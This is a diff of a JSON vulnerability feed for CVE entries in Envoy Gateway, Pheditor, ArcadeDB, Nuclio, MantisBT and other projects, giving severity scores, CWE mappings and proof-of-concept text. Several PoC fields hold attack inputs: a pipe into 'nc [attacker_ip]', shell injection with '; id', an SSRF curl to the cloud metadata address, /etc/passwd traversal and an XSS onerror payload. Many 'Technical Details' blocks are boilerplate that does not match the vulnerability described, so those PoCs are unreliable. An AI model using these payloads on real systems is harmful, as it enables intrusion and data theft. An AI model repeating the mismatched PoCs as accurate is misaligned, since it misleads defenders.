-            "poc": "An unauthenticated attacker sends a request with a manipulated EnvoyExtensionPolicy payload to the gateway. The Lua filter logic fails to validate the request parameters, allowing the attacker to bypass the auth check entirely. The gateway then reveals internal secret strings or tokens in the response. The attacker effectively gains administrative access to sensitive gateway resources.",
-            "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-53713",
-                "https://www.cve.org/CVERecord?id=CVE-2026-53713",
-                "https://www.tenable.com/cve/CVE-2026-53713"
-            ]
-        },
-        {
-            "cve_id": "CVE-2026-55578",
-            "finding_name": "Remote Command Injection in Pheditor Terminal",
-            "description": "The terminal feature within Pheditor fails to perform adequate command sanitization against special shell characters such as pipe operators, backticks, and newlines. The vulnerability stems from passing unsanitized user-provided strings directly to the underlying system shell for execution. An authenticated attacker can leverage this flaw to achieve remote code execution on the host system.",
-            "cvss_score": 8.8,
-            "score_source": "estimated_unverified_recalculated",
-            "severity": "High",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
-            "cvss_breakdown": {
-                "Attack_Vector": "Network",
-                "Attack_Complexity": "Low",
-                "Privileges_Required": "Low",
-                "User_Interaction": "None",
-                "Scope": "Unchanged",
-                "Confidentiality": "High",
-                "Integrity": "High",
-                "Availability": "High"
-            },
-            "cwe_id": "CWE-78",
-            "mitre_mappings": [
                 "T1059"
             ],
-            "urgency_score": 79,
-            "poc": "An authenticated user accesses the Pheditor terminal console feature. The user inputs a command followed by a pipe operator and a malicious system command, such as 'ls | nc [attacker_ip]'. The backend shell executes the concatenated string, interpreting the second command due to insufficient sanitization. This leads to arbitrary code execution with the privileges of the web service process.\n\n**Technical Details:**\n```\nPOST /vulnerable-endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nparam=value; id\n```\n\n**curl command:**\n```bash\ncurl -X POST \"https://target.com/vulnerable-endpoint\" -d \"param=value; id\"\n```\nThe server executes the injected command and returns the output, confirming RCE.",
+            "urgency_score": 57,
+            "poc": "A remote attacker hosts a malicious website designed to trigger cross-origin requests. The attacker lures an authenticated user to visit the malicious site while they have an active session with the FiftyOne App. The browser sends a request to the server, which responds with the wildcard origin header, allowing the attacker's script to read sensitive responses. This results in the exfiltration of application-specific data accessible to the user.",
             "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-55578",
-                "https://www.cve.org/CVERecord?id=CVE-2026-55578",
-                "https://www.tenable.com/cve/CVE-2026-55578"
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-53656",
+                "https://www.cve.org/CVERecord?id=CVE-2026-53656",
+                "https://www.tenable.com/cve/CVE-2026-53656"
             ]
         },
         {
-            "cve_id": "CVE-2026-54540",
-            "finding_name": "Whitelist Bypass in Pheditor Terminal",
-            "description": "The Pheditor terminal interface contains an authentication bypass vulnerability within its command whitelist validation logic. This issue is caused by improper conditional checks when validating authorized command strings against the permitted whitelist. An attacker can use this to execute unauthorized terminal commands despite the presence of a security filter.",
-            "cvss_score": 8.8,
-            "score_source": "estimated_unverified_recalculated",
-            "severity": "High",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
-            "cvss_breakdown": {
-                "Attack_Vector": "Network",
-                "Attack_Complexity": "Low",
-                "Privileges_Required": "Low",
-                "User_Interaction": "None",
-                "Scope": "Unchanged",
-                "Confidentiality": "High",
-                "Integrity": "High",
-                "Availability": "High"
-            },
-            "cwe_id": "CWE-78",
-            "mitre_mappings": [
-                "T1059"
-            ],
-            "urgency_score": 79,
-            "poc": "An authenticated user initiates a command via the Pheditor terminal that is ostensibly restricted by the whitelist. The attacker uses a crafted string that circumvents the application's regex or string-matching filter (e.g., using hidden carriage returns or alternative path representations). The backend logic interprets the string as valid and proceeds to execute the forbidden command. This leads to full administrative command execution on the host.\n\n**Technical Details:**\n```\nPOST /vulnerable-endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nparam=value; id\n```\n\n**curl command:**\n```bash\ncurl -X POST \"https://target.com/vulnerable-endpoint\" -d \"param=value; id\"\n```\nThe server executes the injected command and returns the output, confirming RCE.",
-            "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-54540",
-                "https://www.cve.org/CVERecord?id=CVE-2026-54540",
-                "https://www.tenable.com/cve/CVE-2026-54540"
-            ]
-        },
-        {
-            "cve_id": "CVE-2026-54076",
-            "finding_name": "Unauthorized Schema Mutation in ArcadeDB",
-            "description": "ArcadeDB incorrectly allows users with read-only permissions to perform schema modification operations due to an incomplete fix of a prior vulnerability. The root cause is a failure in the permission enforcement mechanism to correctly restrict metadata-altering commands for low-privilege roles. This allows unauthorized users to modify the database structure, potentially leading to data loss or integrity compromise.",
-            "cvss_score": 8.1,
-            "score_source": "tenable_verified",
-            "severity": "High",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
-            "cvss_breakdown": {
-                "Attack_Vector": "Network",
-                "Attack_Complexity": "Low",
-                "Privileges_Required": "Low",
-                "User_Interaction": "None",
-                "Scope": "Unchanged",
-                "Confidentiality": "None",
-                "Integrity": "High",
-                "Availability": "High"
-            },
-            "cwe_id": "CWE-862",
-            "mitre_mappings": [
-                "T1068"
-            ],
-            "urgency_score": 73,
-            "poc": "An authenticated user with read-only privileges issues a database command designed to drop or alter a critical schema table. The ArcadeDB server evaluates the user's role against an insufficient access control list, failing to block the schema mutation. The command is successfully committed, causing unintended structural changes. This demonstrates unauthorized modification of database integrity.",
-            "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-54076",
-                "https://www.cve.org/CVERecord?id=CVE-2026-54076",
-                "https://www.tenable.com/cve/CVE-2026-54076"
-            ]
-        },
-        {
-            "cve_id": "CVE-2026-52833",
-            "finding_name": "Remote Code Execution via Nuclio Build Injection",
-            "description": "Nuclio is susceptible to remote code execution due to unsanitized runtimeAttributes.repositories being injected directly into the generated build.gradle file. The vulnerability occurs when the build system processes external configuration attributes without validating their contents for command injection tokens. An attacker can provide malicious build repository configurations to execute arbitrary code during the container build process.",
-            "cvss_score": 8.0,
-            "score_source": "tenable_verified",
-            "severity": "High",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H",
-            "cvss_breakdown": {
-                "Attack_Vector": "Network",
-                "Attack_Complexity": "High",
-                "Privileges_Required": "High",
-                "User_Interaction": "None",
-                "Scope": "Changed",
-                "Confidentiality": "High",
-                "Integrity": "High",
-                "Availability": "High"
-            },
-            "cwe_id": "CWE-94",
-            "mitre_mappings": [
-                "T1059"
-            ],
-            "urgency_score": 72,
-            "poc": "An attacker initiates a function build request and modifies the runtimeAttributes.repositories field to include a malicious Groovy snippet. The Nuclio builder accepts the input and renders the build.gradle file with the injected code. Upon build execution, the shell evaluates the injected command, leading to code execution. The attacker gains control over the CI/CD pipeline or build environment.\n\n**Technical Details:**\n```\nPOST /vulnerable-endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nparam=value; id\n```\n\n**curl command:**\n```bash\ncurl -X POST \"https://target.com/vulnerable-endpoint\" -d \"param=value; id\"\n```\nThe server executes the injected command and returns the output, confirming RCE.",
-            "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-52833",
-                "https://www.cve.org/CVERecord?id=CVE-2026-52833",
-                "https://www.tenable.com/cve/CVE-2026-52833"
-            ]
-        },
-        {
-            "cve_id": "CVE-2026-52870",
-            "finding_name": "Unauthorized Task Access in MCP Python SDK",
-            "description": "Experimental task handlers in the MCP Python SDK allow any authenticated client to access and cancel tasks initiated by other users. This is caused by a lack of resource-level ownership validation within the task management interface. An attacker can disrupt service availability or exfiltrate task-related metadata by manipulating concurrent jobs.",
-            "cvss_score": 7.6,
+            "cve_id": "CVE-2026-50552",
+            "finding_name": "SSRF in Koel Radio Station Creation",
+            "description": "The radio station creation functionality in Koel contains a Server-Side Request Forgery vulnerability due to the lack of input validation on the station URL. The root cause is that the application does not properly validate the target host of the provided radio stream before attempting to establish a connection. An attacker can use this flaw to force the server to initiate arbitrary network requests, impacting confidentiality and integrity.",
+            "cvss_score": 6.3,
             "score_source": "cve_org_official",
-            "severity": "High",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L",
+            "severity": "Medium",
+            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L",
             "cvss_breakdown": {
                 "Attack_Vector": "Network",
                 "Attack_Complexity": "Low",
                 "Privileges_Required": "Low",
                 "User_Interaction": "None",
                 "Scope": "Unchanged",
-                "Confidentiality": "High",
+                "Confidentiality": "Low",
                 "Integrity": "Low",
                 "Availability": "Low"
             },
-            "cwe_id": "CWE-862",
+            "cwe_id": "CWE-918",
             "mitre_mappings": [
-                "T1489"
+                "T1190"
             ],
-            "urgency_score": 68,
-            "poc": "An authenticated attacker lists all active tasks via the experimental task management API. Upon identifying a task owned by another user, the attacker submits a 'cancel' request to the endpoint referencing the target task ID. The SDK backend fails to verify if the requesting user owns the targeted task. Consequently, the task is terminated, successfully impacting the victim's workflow.",
+            "urgency_score": 57,
+            "poc": "An authenticated user submits a request to the Koel radio station creation endpoint with an attacker-controlled URL as the stream address. The server processes this request and attempts to fetch metadata from the provided URL without validating the host. This allows the attacker to probe internal network services, resulting in unauthorized information disclosure or interaction with local network infrastructure.\n\n**Technical Details:**\n```\nGET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: target.com\n```\n\n**curl command:**\n```bash\ncurl \"https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/\"\n```\nThe server returns internal metadata, confirming SSRF.",
             "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-52870",
-                "https://www.cve.org/CVERecord?id=CVE-2026-52870",
-                "https://www.tenable.com/cve/CVE-2026-52870"
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-50552",
+                "https://www.cve.org/CVERecord?id=CVE-2026-50552",
+                "https://www.tenable.com/cve/CVE-2026-50552"
             ]
         },
         {
-            "cve_id": "CVE-2026-53714",
-            "finding_name": "xDS Control Plane Information Disclosure",
-            "description": "Envoy Gateway suffers from an xDS Control Plane Information Disclosure vulnerability when operating in GatewayNamespaceMode. This occurs because the gateway improperly exposes xDS configuration data across namespace boundaries, failing to enforce strict isolation. An attacker in an adjacent namespace can gain visibility into service mesh traffic policies and metadata.",
-            "cvss_score": 7.4,
+            "cve_id": "CVE-2026-52881",
+            "finding_name": "Reflected XSS in MantisBT install.php",
+            "description": "A reflected cross-site scripting (XSS) vulnerability exists in the admin/install.php script of MantisBT due to unescaped output from a printf function. The script reflects user-supplied data in the response without implementing proper contextual encoding. An attacker can craft a malicious URL to execute arbitrary scripts in the browser of an administrator attempting to perform an installation.",
+            "cvss_score": 6.1,
             "score_source": "tenable_verified",
-            "severity": "High",
-            "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+            "severity": "Medium",
+            "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
             "cvss_breakdown": {
-                "Attack_Vector": "Adjacent",
+                "Attack_Vector": "Network",
                 "Attack_Complexity": "Low",
                 "Privileges_Required": "None",
-                "User_Interaction": "None",
+                "User_Interaction": "Required",
                 "Scope": "Changed",
-                "Confidentiality": "High",
-                "Integrity": "None",
-                "Availability": "None"
-            },
-            "cwe_id": "CWE-306",
-            "mitre_mappings": [
-                "T1592"
-            ],
-            "urgency_score": 67,
-            "poc": "An attacker residing in a separate, low-privileged namespace sends requests to the Envoy Gateway management interface. The gateway, misconfigured in GatewayNamespaceMode, serves xDS configuration data that should be scoped only to the admin namespace. The attacker captures sensitive routing information and backend service metadata. This aids the attacker in mapping out the internal infrastructure.",
-            "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-53714",
-                "https://www.cve.org/CVERecord?id=CVE-2026-53714",
-                "https://www.tenable.com/cve/CVE-2026-53714"
-            ]
-        },
-        {
-            "cve_id": "CVE-2026-54077",
-            "finding_name": "Local File Read via Import in ArcadeDB",
-            "description": "The IMPORT DATABASE feature in ArcadeDB improperly validates file paths, allowing authenticated users to read arbitrary files from the local filesystem. This occurs because the application lacks sufficient path traversal protection when processing import parameters. An attacker can leverage this to extract sensitive configuration or credential files accessible by the database process.",
-            "cvss_score": 7.1,
-            "score_source": "tenable_verified",
-            "severity": "High",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:L",
-            "cvss_breakdown": {
-                "Attack_Vector": "Network",
-                "Attack_Complexity": "Low",
-                "Privileges_Required": "Low",
-                "User_Interaction": "None",
-                "Scope": "Unchanged",
-                "Confidentiality": "High",
-                "Integrity": "None",
-                "Availability": "Low"
-            },
-            "cwe_id": "CWE-22",
-            "mitre_mappings": [
-                "T1005"
-            ],
-            "urgency_score": 64,
-            "poc": "An authenticated user provides a crafted file path, such as '/etc/passwd', as the source for the IMPORT DATABASE operation. The ArcadeDB server neglects to normalize or validate the input path, opening the targeted local file. The contents of the sensitive file are then included in the database import output. This allows the attacker to read arbitrary files from the system.\n\n**Technical Details:**\n```\nGET /assets/../../../../etc/passwd HTTP/1.1\nHost: target.com\n```\n\n**curl command:**\n```bash\ncurl \"https://target.com/assets/../../../../etc/passwd\"\n```\nThe server returns the contents of /etc/passwd, confirming path traversal.",
-            "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-54077",
-                "https://www.cve.org/CVERecord?id=CVE-2026-54077",
-                "https://www.tenable.com/cve/CVE-2026-54077"
-            ]
-        },
-        {
-            "cve_id": "CVE-2026-52869",
-            "finding_name": "Session Hijacking in MCP Python SDK",
-            "description": "The MCP Python SDK HTTP transport service processes session requests without properly verifying the authenticated principal associated with the session. This vulnerability is rooted in an insecure session validation mechanism that relies on easily spoofable or predictable session tokens. An attacker can exploit this to perform unauthorized actions as another user on the network.",
-            "cvss_score": 7.1,
-            "score_source": "cve_org_official",
-            "severity": "High",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:L",
-            "cvss_breakdown": {
-                "Attack_Vector": "Network",
-                "Attack_Complexity": "High",
-                "Privileges_Required": "Low",
-                "User_Interaction": "None",
-                "Scope": "Unchanged",
-                "Confidentiality": "High",
-                "Integrity": "High",
-                "Availability": "Low"
-            },
-            "cwe_id": "CWE-639",
-            "mitre_mappings": [
-                "T1558"
-            ],
-            "urgency_score": 64,
-            "poc": "A low-privileged authenticated attacker intercepts or predicts a session identifier belonging to a different user. The attacker sends a request to the SDK HTTP transport endpoint while including the hijacked session token in the header. The server accepts the request without verifying if the token actually matches the current requester's credentials. This allows the attacker to execute operations with the hijacked user's permissions.\n\n**Technical Details:**\n```\nGET /api/orders/12345 HTTP/1.1\nHost: target.com\n```\n\nThe attacker changes the order ID to `12346` and retrieves another user's order.\n**curl command:**\n```bash\ncurl \"https://target.com/api/orders/12346\"\n```\nThe server returns the order of a different user without authorization, confirming IDOR.",
-            "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-52869",
-                "https://www.cve.org/CVERecord?id=CVE-2026-52869",
-                "https://www.tenable.com/cve/CVE-2026-52869"
-            ]
-        },
-        {
-            "cve_id": "CVE-2026-53717",
-            "finding_name": "Large Allocation via Untrusted Tar Headers",
-            "description": "Envoy Gateway performs an oversized memory allocation using make([]byte, h.Size) when extracting OCI layers from tar files provided by untrusted headers. The vulnerability exists because the application trusts the size field within the tar header without enforcing reasonable maximum limits. An attacker can cause a memory exhaustion condition by providing a maliciously crafted tar header.",
-            "cvss_score": 6.5,
-            "score_source": "tenable_verified",
-            "severity": "Medium",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
-            "cvss_breakdown": {
-                "Attack_Vector": "Network",
-                "Attack_Complexity": "Low",
-                "Privileges_Required": "Low",
-                "User_Interaction": "None",
-                "Scope": "Unchanged",
-                "Confidentiality": "None",
-                "Integrity": "None",
-                "Availability": "High"
-            },
-            "cwe_id": "CWE-789",
-            "mitre_mappings": [
-                "T1498"
-            ],
-            "urgency_score": 58,
-            "poc": "An attacker sends a crafted OCI image manifest to the gateway containing a tar layer with an extremely large size defined in its header. The gateway process receives the header and immediately allocates a byte slice based on the untrusted size value. The server runs out of memory and crashes as it attempts to accommodate the massive allocation request. This successfully achieves a denial-of-service.",
-            "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-53717",
-                "https://www.cve.org/CVERecord?id=CVE-2026-53717",
-                "https://www.tenable.com/cve/CVE-2026-53717"
-            ]
-        },
-        {
-            "cve_id": "CVE-2026-53719",
-            "finding_name": "NULL Pointer Dereference in SecurityPolicy",
-            "description": "Envoy Gateway triggers a nil-dereference when a SecurityPolicy targets a TCPRoute that lacks an explicitly defined spec.authorization field. This crash is caused by the gateway assuming the existence of an authorization object during policy evaluation. An attacker can exploit this to disrupt availability by submitting specific policy-targeted requests.",
-            "cvss_score": 6.5,
-            "score_source": "tenable_verified",
-            "severity": "Medium",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
-            "cvss_breakdown": {
-                "Attack_Vector": "Network",
-                "Attack_Complexity": "Low",
-                "Privileges_Required": "Low",
-                "User_Interaction": "None",
-                "Scope": "Unchanged",
-                "Confidentiality": "None",
-                "Integrity": "None",
-                "Availability": "High"
-            },
-            "cwe_id": "CWE-476",
-            "mitre_mappings": [
-                "T1498"
-            ],
-            "urgency_score": 58,
-            "poc": "An attacker configures or targets a SecurityPolicy towards a TCPRoute on the Envoy Gateway that omits the spec.authorization field. The gateway processes the policy and attempts to access the missing authorization member, triggering a nil pointer dereference. The process terminates immediately to prevent inconsistent memory state. The gateway is rendered unavailable for further traffic processing.",
-            "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-53719",
-                "https://www.cve.org/CVERecord?id=CVE-2026-53719",
-                "https://www.tenable.com/cve/CVE-2026-53719"
-            ]
-        },
-        {
-            "cve_id": "CVE-2026-53716",
-            "finding_name": "Unbounded Gzip Decompression in Wasm Fetch",
-            "description": "The Envoy Gateway Wasm HTTP fetch functionality fails to enforce an output-size limit when decompressing gzip-encoded responses. This failure allows a malicious server to send highly compressed data that expands to a significantly larger size, causing memory exhaustion. This constitutes a resource exhaustion vulnerability leading to denial-of-service.",
-            "cvss_score": 6.5,
-            "score_source": "tenable_verified",
-            "severity": "Medium",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
-            "cvss_breakdown": {
-                "Attack_Vector": "Network",
-                "Attack_Complexity": "Low",
-                "Privileges_Required": "Low",
-                "User_Interaction": "None",
-                "Scope": "Unchanged",
-                "Confidentiality": "None",
-                "Integrity": "None",
-                "Availability": "High"
-            },
-            "cwe_id": "CWE-789",
-            "mitre_mappings": [
-                "T1498"
-            ],
-            "urgency_score": 58,
-            "poc": "An attacker sets up a malicious web server and instructs the Envoy Gateway to fetch a resource from it via the Wasm plugin. The server responds with a small, heavily compressed zip bomb. The gateway plugin decompresses the response in memory without checking the size limit. The massive expansion consumes all available RAM, causing the gateway process to crash.\n\n**Technical Details:**\n```\nAn attacker sends a specially crafted input that triggers resource exhaustion.\nFor example, a deeply nested structure or a massive list can consume CPU or memory.\n**curl command (conceptual):**\n```bash\ncurl \"https://target.com/vulnerable-endpoint?payload=<malicious_input>\"\n```\nThe server becomes unresponsive or crashes, confirming the denial of service.",
-            "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-53716",
-                "https://www.cve.org/CVERecord?id=CVE-2026-53716",
-                "https://www.tenable.com/cve/CVE-2026-53716"
-            ]
-        },
-        {
-            "cve_id": "CVE-2026-53718",
-            "finding_name": "ReferenceGrant Bypass in Envoy Gateway",
-            "description": "Envoy Gateway allows custom backendRef configurations to bypass cross-namespace ReferenceGrant restrictions. This vulnerability occurs because the gateway's validation logic fails to correctly enforce namespace boundary checks for custom resource references. An attacker can leverage this to gain access to services or secrets in forbidden namespaces.",
-            "cvss_score": 6.4,
-            "score_source": "tenable_verified",
-            "severity": "Medium",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:L",
-            "cvss_breakdown": {
-                "Attack_Vector": "Network",
-                "Attack_Complexity": "High",
-                "Privileges_Required": "Low",
-                "User_Interaction": "None",
-                "Scope": "Unchanged",
-                "Confidentiality": "High",
+                "Confidentiality": "Low",
                 "Integrity": "Low",
-                "Availability": "Low"
+                "Availability": "None"
             },
-            "cwe_id": "CWE-862",
+            "cwe_id": "CWE-79",
             "mitre_mappings": [
-                "T1068"
+                "T1059"
             ],
-            "urgency_score": 58,
-            "poc": "An attacker creates a custom backendRef resource in their own namespace that points to a protected service in a separate namespace. The Envoy Gateway verifies the references but fails to consult the ReferenceGrant authorization policies before applying the route. The backend is successfully linked to the malicious route. The attacker then intercepts or interacts with sensitive services outside their original authority.",
+            "urgency_score": 55,
+            "poc": "The attacker constructs a URL targeting the admin/install.php endpoint with a script payload injected into a URL parameter. The attacker persuades an administrator to click the crafted link. The server reflects the malicious payload back to the administrator's browser, which then executes the script. This results in the complete compromise of the administrator's session and potential modification of the system configuration.\n\n**Technical Details:**\n```\nGET /search?q=<img src=x onerror=alert(1)> HTTP/1.1\nHost: target.com\n```\n\n**curl command:**\n```bash\ncurl \"https://target.com/search?q=<img src=x onerror=alert(1)>\"\n```\nThe server reflects the unsanitized payload in the response, confirming XSS.",
             "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-53718",
-                "https://www.cve.org/CVERecord?id=CVE-2026-53718",
-                "https://www.tenable.com/cve/CVE-2026-53718"
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-52881",
+                "https://www.cve.org/CVERecord?id=CVE-2026-52881",
+                "https://www.tenable.com/cve/CVE-2026-52881"
             ]
         },
         {
-            "cve_id": "CVE-2026-53715",
-            "finding_name": "Race Condition in Wasm Cache Storage",
-            "description": "The Wasm cache ServeHTTP component in Envoy Gateway accesses the mappingPath2Cache map without proper synchronization locks. This lack of thread safety results in a race condition when multiple threads attempt to access or modify the cache simultaneously. An attacker could potentially cause memory corruption or undefined application behavior by inducing concurrent access.",
-            "cvss_score": 5.3,
+            "cve_id": "CVE-2026-52847",
+            "finding_name": "Reflected XSS in MantisBT Admin Installation",
+            "description": "The admin/install.php file in MantisBT contains a reflected XSS vulnerability where user inputs are rendered without proper sanitization. This is caused by improper handling of data flow between the user's browser request and the administrative installation script's output. Successful exploitation allows an attacker to execute malicious scripts in the security context of the administrative user.",
+            "cvss_score": 6.1,
             "score_source": "tenable_verified",
             "severity": "Medium",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H",
-            "cvss_breakdown": {
-                "Attack_Vector": "Network",
-                "Attack_Complexity": "High",
-                "Privileges_Required": "Low",
-                "User_Interaction": "None",
-                "Scope": "Unchanged",
-                "Confidentiality": "None",
-                "Integrity": "None",
-                "Availability": "High"
-            },
-            "cwe_id": "CWE-362",
-            "mitre_mappings": [
-                "T1068"
-            ],
-            "urgency_score": 48,
-            "poc": "An attacker floods the Envoy Gateway with high-frequency requests that trigger simultaneous Wasm cache ServeHTTP operations. The gateway performs unsynchronized access to mappingPath2Cache, leading to a race condition. The underlying data structure becomes inconsistent due to competing write operations. This results in intermittent application crashes or potentially unintended cache responses.",
-            "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-53715",
-                "https://www.cve.org/CVERecord?id=CVE-2026-53715",
-                "https://www.tenable.com/cve/CVE-2026-53715"
-            ]
-        },
-        {
-            "cve_id": "CVE-2026-52832",
-            "finding_name": "Path Traversal Write in Nuclio Dashboard",
-            "description": "The Nuclio Dashboard container contains an unauthenticated path traversal vulnerability in the spec.handler parameter. This flaw exists because user-supplied input is used to construct file paths without proper normalization or sanitization, allowing for directory escape. An attacker can overwrite sensitive system files within the dashboard container environment.",
-            "cvss_score": 4.9,
-            "score_source": "tenable_verified",
-            "severity": "Medium",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:N",
+            "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
             "cvss_breakdown": {
                 "Attack_Vector": "Network",
                 "Attack_Complexity": "Low",
-                "Privileges_Required": "High",
-                "User_Interaction": "None",
-                "Scope": "Unchanged",
-                "Confidentiality": "None",
-                "Integrity": "High",
+                "Privileges_Required": "None",
+                "User_Interaction": "Required",
+                "Scope": "Changed",
+                "Confidentiality": "Low",
+                "Integrity": "Low",
                 "Availability": "None"
             },
-            "cwe_id": "CWE-22",
+            "cwe_id": "CWE-79",
             "mitre_mappings": [
-                "T1083"
+                "T1059"
             ],
-            "urgency_score": 44,
-            "poc": "An unauthenticated remote attacker sends a specially crafted POST request containing path traversal sequences like '../../' in the spec.handler field. The Nuclio dashboard process interprets these sequences, resolving the write operation to a directory outside the intended target. The attacker then successfully overwrites an arbitrary file in the container. This compromise facilitates potential future code execution.\n\n**Technical Details:**\n```\nGET /assets/../../../../etc/passwd HTTP/1.1\nHost: target.com\n```\n\n**curl command:**\n```bash\ncurl \"https://target.com/assets/../../../../etc/passwd\"\n```\nThe server returns the contents of /etc/passwd, confirming path traversal.",
+            "urgency_score": 55,
+            "poc": "The attacker prepares a link to the admin/install.php page containing a JavaScript payload in one of the input parameters. Upon clicking the link, the administrative user's browser renders the malicious input without validation. The script triggers in the administrator's active session. This leads to unauthorized actions being performed under the administrator's identity.\n\n**Technical Details:**\n```\nGET /search?q=<img src=x onerror=alert(1)> HTTP/1.1\nHost: target.com\n```\n\n**curl command:**\n```bash\ncurl \"https://target.com/search?q=<img src=x onerror=alert(1)>\"\n```\nThe server reflects the unsanitized payload in the response, confirming XSS.",
             "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-52832",
-                "https://www.cve.org/CVERecord?id=CVE-2026-52832",
-                "https://www.tenable.com/cve/CVE-2026-52832"
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-52847",
+                "https://www.cve.org/CVERecord?id=CVE-2026-52847",
+                "https://www.tenable.com/cve/CVE-2026-52847"
             ]
         },
         {
-            "cve_id": "CVE-2026-54542",
-            "finding_name": "Out-of-Bounds Panic in Nimiq-Primitives",
-            "description": "The KeyNibbles::Add function in nimiq-primitives triggers an out-of-bounds panic when encountering an oversized child suffix in a deserialized proof. The issue arises from a lack of boundary checks before attempting to slice or access elements within the child suffix vector. This can lead to a denial-of-service (DoS) condition if a malicious actor submits a malformed proof.",
-            "cvss_score": 3.7,
-            "score_source": "estimated_unverified_recalculated",
-            "severity": "Low",
-            "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+            "cve_id": "CVE-2026-62944",
+            "finding_name": "Stored XSS in MantisBT print_all_bug_page_word.php",
+            "description": "MantisBT exhibits a stored cross-site scripting (XSS) vulnerability within the print_all_bug_page_word.php script. The application fails to properly sanitize user-supplied input stored in bug records before rendering it within the generated word document view. An attacker with the ability to create or edit bug reports can execute arbitrary JavaScript in the context of an administrator viewing the print report.",
+            "cvss_score": 5.4,
+            "score_source": "tenable_verified",
+            "severity": "Medium",
+            "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
             "cvss_breakdown": {
                 "Attack_Vector": "Network",
-                "Attack_Complexity": "High",
-                "Privileges_Required": "None",
-                "User_Interaction": "None",
-                "Scope": "Unchanged",
-                "Confidentiality": "None",
-                "Integrity": "None",
-                "Availability": "Low"
+                "Attack_Complexity": "Low",
+                "Privileges_Required": "Low",
+                "User_Interaction": "Required",
+                "Scope": "Changed",
+                "Confidentiality": "Low",
+                "Integrity": "Low",
+                "Availability": "None"
             },
-            "cwe_id": "CWE-125",
+            "cwe_id": "CWE-79",
             "mitre_mappings": [
-                "T1498"
+                "T1059"
             ],
-            "urgency_score": 28,
-            "poc": "An attacker crafts a serialized cryptographic proof containing an oversized child suffix segment. The attacker transmits this proof to a service utilizing the nimiq-primitives library for validation. The KeyNibbles::Add method attempts to process the payload and panics due to the missing boundary check. The application process terminates abruptly, resulting in a denial-of-service for that node.\n\n**Technical Details:**\n```\nAn attacker sends a specially crafted input that triggers resource exhaustion.\nFor example, a deeply nested structure or a massive list can consume CPU or memory.\n**curl command (conceptual):**\n```bash\ncurl \"https://target.com/vulnerable-endpoint?payload=<malicious_input>\"\n```\nThe server becomes unresponsive or crashes, confirming the denial of service.",
+            "urgency_score": 49,
+            "poc": "An authenticated user creates a bug report with a malicious payload inside the summary or description field. The attacker waits for an administrator to navigate to the 'print_all_bug_page_word.php' page. The server serves the stored malicious script to the administrator's browser. This allows the attacker to steal the administrator's session cookie and perform unauthorized actions on the platform.\n\n**Technical Details:**\n```\nGET /search?q=<img src=x onerror=alert(1)> HTTP/1.1\nHost: target.com\n```\n\n**curl command:**\n```bash\ncurl \"https://target.com/search?q=<img src=x onerror=alert(1)>\"\n```\nThe server reflects the unsanitized payload in the response, confirming XSS.",
             "references": [
-                "https://nvd.nist.gov/vuln/detail/CVE-2026-54542",
-                "https://www.cve.org/CVERecord?id=CVE-2026-54542",
-                "https://www.tenable.com/cve/CVE-2026-54542"
+                "https://nvd.nist.gov/vuln/detail/CVE-2026-62944",
+                "https://www.cve.org/CVERecord?id=CVE-2026-62944",
